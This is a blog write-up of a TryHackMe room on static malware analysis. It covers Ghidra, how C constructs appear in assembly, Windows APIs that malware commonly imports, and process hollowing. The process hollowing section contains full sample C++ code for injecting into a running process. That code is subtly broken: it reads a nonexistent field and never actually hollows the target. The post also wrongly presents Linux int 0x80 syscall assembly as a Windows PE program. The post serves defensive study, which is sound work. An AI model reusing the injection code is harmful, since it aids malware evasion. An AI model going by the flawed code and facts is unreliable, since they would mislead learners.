---
title: Advanced Static Analysis
date: 2026-08-03 00:00:00 +0200
categories: [Malware Analysis]
tags: [malware analysis, process hollowing, ghidra, static analysis, assembly, windows, windows API]
series: ""
series_order: 
---

> **Disclaimer**: This post contains my personal notes and methodology for the respective TryHackMe room. All the credits for the room and the lab environment go to the original creators at TryHackMe. **Flags are not revealed** to preserve the challenge for others. 
{: .prompt-info}

## Objective

> Learn how to identify code constructs and examine the assembly code of malware.

The focus is on analyzing the code and structure of malware **without executing it**. 

There's many tools such as Ghidra, IDA pro and radare2 when it comes to disassembling malware (often malware, from the defenders' perspective, is in the form of a binary which needs to be disassembled to view the assembly code or decompiled to view the higher level code in C or C++). 

---

## Ghidra overview

Ghidra is one of the more popular choices, allowing us to decompile and disassemble binaries. 

![Ghidra import results summary]({{ "assets/img/asa_1.png" | relative_url}})

![Ghidra overview]({{ "assets/img/asa_2.png" | relative_url}})

> Ghidra doesn't land directly on main, especially for malware that has a lot of code that's obfuscated. You have to find it through **entry** points. 
{: .prompt-info}

In this program, In the exports section, there's an entry. The below flow, takes us to the function that prints hello world: 

`void entry` -> `int __cdecl __scrt_common_main` -> `int __cdecl __scrt_common_main_seh` -> `int __cdecl invoke_main` -> `undefined FUN_004073b0`

![Ghidra, hello world]({{ "assets/img/asa_3.png" | relative_url}})

> Ghidra can help a lot with the imports and exports within a binary, and the virtual addresses within the disassembler. 
{: .prompt-tip}

![Ghidra disassembler]({{ "assets/img/asa_4.png" | relative_url}})

Ghidra also has features to display the memory map, which can be useful

![Ghidra memory map]({{ "assets/img/asa_5.png" | relative_url}})

---

## Identifying C constructs in Assembly

> We are working with 32-bit PE executables here. But often, you will encounter 64-bit binaries more, since, as of many years, 64-bit machines have been the most common. 
{: .prompt-danger}

> Different compilers add their own code for various checks while compiling. Expect some garbage assembly code within the overall assembly code. 
{: .prompt-warning}

A simple Hello World program in C would be as follows: 

```C
#include <stdio.h>

int main() { printf("Hello, world!");
    return 0;
}
```

and the resulting assembly code would look like (as a windows PE executable): 

```asm
  section .data 
    message db 'HELLO WORLD!!', 0

section .text
    global _start

_start:
    ; write the message to stdout
    mov eax, 4      ; write system call
    mov ebx, 1      ; file descriptor for stdout
    mov ecx, message    ; pointer to message
    mov edx, 13     ; message length
    int 0x80        ; call kernel
```

> Of course, it goes without saying, that the same C program would produce different assembly code in different operating systems. 
{: .prompt-warning}


### Identifying loops

```asm
  main:
    ; initialize loop counter to 1
    mov ecx, 1

    ; loop 5 times
    mov edx, 5
loop:
    ; print the loop counter
    push ecx
    push format
    call printf
    add esp, 8

    ; increment loop counter
    inc ecx

    ; check if the loop is finished
    cmp ecx, edx
    jle loop
```

Often, there would be a inc (increment) or dec (decrement), a cmp (compare) and a jump instruction (comes in various kinds). 

In the above code, `jle` means jump if less than or equal to. 

---

### While loop assembly 

```asm

        0040151a c7 44 24        MOV        dword ptr [ESP + local_14],0x1
                 1c 01 00 
                 00 00
        00401522 eb 11           JMP        LAB_00401535
                             LAB_00401524                                    XREF[1]:     0040153a(j)  
        00401524 c7 04 24        MOV        dword ptr [ESP]=>local_30,s__ITs_Fun_to_Learn_   
                 26 40 40 00
        0040152b e8 e8 10        CALL       _puts                                            int _puts(char * _Str)
                 00 00
        00401530 83 44 24        ADD        dword ptr [ESP + local_14],0x1
                 1c 01


                             LAB_00401535                                    XREF[1]:     00401522(j)  
        00401535 83 7c 24        CMP        dword ptr [ESP + local_14],0x4
                 1c 04
        0040153a 7e e8           JLE        LAB_00401524
        0040153c c7 04 24        MOV        dword ptr [ESP]=>local_30,s_That's_the_end_of_  
                 40 40 40 00
        00401543 e8 d0 10        CALL       _puts                                            int _puts(char * _Str)
                 00 00
        00401548 b8 00 00        MOV        EAX,0x0
                 00 00

```

The above code will print "It's fun to ..." string 4 times, followed by "That's the end ..."

---

### if else construction

```asm
        00401534 89 44 24 14     MOV        dword ptr [ESP + local_1c],EAX
        00401538 81 7c 24        CMP        dword ptr [ESP + local_1c],0x1f4
                 14 f4 01 
                 00 00
        00401540 7e 0e           JLE        LAB_00401550
        00401542 c7 04 24        MOV        dword ptr [ESP]=>local_30,s_The_sum_is_greater   = "The sum is greater than 500 v
                 30 40 40 00
        00401549 e8 fa 10        CALL       _puts                                            int _puts(char * _Str)
                 00 00
        0040154e eb 24           JMP        LAB_00401574

```

Nothing much here, except for a `cmp` and a `jle` code loop, that works as a if condition within the assembly, and the else condition is constructed the same way, and works if the if condition fails. 


---

## Overview of a Windows API call: `CreateProcessA`

This function creates a new process and its primary thread. 

How it looks when used in C code: 

```C
#include 

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, "C:\\\\Windows\\\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed (%d).\\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

And the function call in assembly looks as follows: 

```
push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
```

What's happening above is that, all of the arguments/parameters required for the function call, are setup, before the call, so that it can execute correctly. Since it is a **32-bit** machine, the stack is used primarily for all this. But if it were a **64-bit** machine, the registers such as `rax`, `rdi`, `rsi`, `rdx` .. would be used. 

> You can learn a lot about the Windows API calls from Microsoft's documentation. 
{: .prompt-info}

---

## Common APIs used by malware

> Examine the imports in a binary. All the functions imported would be listed there. They would give a lot of information on what the binary does, all without running the binary!
{: .prompt-tip}

- Keylogging
    - `SetWindowsHookEx`
    - `GetAsyncKeyState`
    - `GetKeyboardState`
    - `GetKeyNameText`
- Downloader: Malware that downloads other malware on victim's system
    - `URLDownloadToFile`
    - `WinHttpOpen`
    - `WinHttpConnect`
    - `WinHttpOpenRequest`
- C2 Communication
    - `InternetOpen`
    - `InternetOpenUrl`
    - `HttpOpenRequest`
    - `HttpSendRequest`
- Data Exfiltration
    - `InternetReadFile`
    - `FtpPutFile`
    - `CreateFile`
    - `WriteFile`
    - `GetClipboardData`, also applies for keylogging
- Dropper
    - `CreateProcess`
    - `VirtualAlloc`
    - `WriteProcessMemory`
- API Hooking: Malware uses this technique to intercept Windows API calls. 
    - `GetProcAddress`
    - `LoadLibrary`
    - `SetWindowsHookEx`
- Anti-debugging and VM detection
    - `IsDebuggerPresent`
    - `CheckRemoteDebuggerPresent`
    - `NtQueryInformationProcess`
    - `GetTickCount`
    - `GetModuleHandle`
    - `GetSystemMetrics`


---

## Process Hollowing

A technique malware uses to inject malicious code into a legitimate process running on a victim's computer. This way, the malicious code gets the permissions of the legitimate process, bypassing security measures. 

The steps are as follows: 

- Create a new process using the **CreateProcessA()** API. This process will be legitimate and hollowed out.
- **NtSuspendProcess()** is then used to suspend the new process.
- Allocate memory in the suspended process using the **VirtualAllocEx()** API. This memory will be used to hold the malicious code.
- Write the malicious code to the allocated memory using the **WriteProcessMemory()** API.
- Modify the entry point of the process to point to the address of the malicious code using the **SetThreadContext()** and **GetThreadContext()** APIs.
- Resume the suspended process using the **NtResumeProcess()** API. This will cause the process to execute the malicious code.
- Clean up the process and any resources used during the process.

Sample C code is shown below. 

### Sample process hollowing C code

```C
#include 
#include 
#include 
using namespace std;

bool HollowProcess(char *szSourceProcessName, char *szTargetProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp((const char*)pe.szExeFile, szTargetProcessName) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProcess == NULL)
                {
                    return false;
                }

                IMAGE_DOS_HEADER idh;
                IMAGE_NT_HEADERS inth;
                IMAGE_SECTION_HEADER ish;

                DWORD dwRead = 0;

                ReadProcessMemory(hProcess, (LPVOID)pe.modBaseAddr, &idh, sizeof(idh), &dwRead);
                ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew), &inth, sizeof(inth), &dwRead);

                LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, inth.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (lpBaseAddress == NULL)
                {
                    return false;
                }

                if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)pe.modBaseAddr, inth.OptionalHeader.SizeOfHeaders, &dwRead))
                {
                    return false;
                }

                for (int i = 0; i < inth.FileHeader.NumberOfSections; i++)
                {
                    ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))), &ish, sizeof(ish), &dwRead);
                    WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + ish.VirtualAddress), (LPVOID)((DWORD)pe.modBaseAddr + ish.PointerToRawData), ish.SizeOfRawData, &dwRead);
                }

                DWORD dwEntrypoint = (DWORD)pe.modBaseAddr + inth.OptionalHeader.AddressOfEntryPoint;
                DWORD dwOffset = (DWORD)lpBaseAddress - inth.OptionalHeader.ImageBase + dwEntrypoint;

                if (!WriteProcessMemory(hProcess, (LPVOID)(lpBaseAddress + dwEntrypoint - (DWORD)pe.modBaseAddr), &dwOffset, sizeof(DWORD), &dwRead))
                {
                    return false;
                }

                CloseHandle(hProcess);

                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, szSourceProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ctx.Eax = (DWORD)pi.lpBaseOfImage + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew + ((IMAGE_NT_HEADERS*)(((BYTE*)pi.lpBaseOfImage) + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

int main()
{
    char* szSourceProcessName = "C:\\\\Windows\\\\System32\\\\calc.exe";
    char* szTargetProcessName = "notepad.exe";

    if (HollowProcess(szSourceProcessName, szTargetProcessName))
    {
        cout << "Process hollowing successful" << endl;
    }
    else
    {
        cout << "Process hollowing failed" << endl;
    }

    return 0;
}
```

---

### Analyzing Process Hollowing

Using **Imports** in Ghidra, find `CreateProcessA`, right-click on it and choose **Show References To**. This will give a window with virtual addresses of all the locations the function is called. 

![CreateProcess]({{ "assets/img/asa_6.png" | relative_url}})

![suspended state]({{ "assets/img/asa_7.png" | relative_url}})

In the above image, `push 0x4` signifies something important: this is the hexadecimal value that tells the system to create the thread of a process in a **suspended state**. 

If we check the function graph view, we can see that, there are two paths the code can take. The red arrow indicates the path taken if the process **fails** to be created in a suspended state. The green arrow represents successful creation of victim process in suspended state. 

![success and failure, function graph]({{ "assets/img/asa_8.png" | relative_url}})


`NtUnmapViewOfSection` is used to access the process's memory. 

![process memory access]({{ "assets/img/asa_9.png" | relative_url}})

And finally, `WriteProcessMemory` and `SetThreadContext` are used to resume the thread to execute the malicious code written. 


> In this program, a file with malicious code was created as C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe, which was then written onto the memory of the legitimate internet explorer process. 
{: .prompt-info}


---

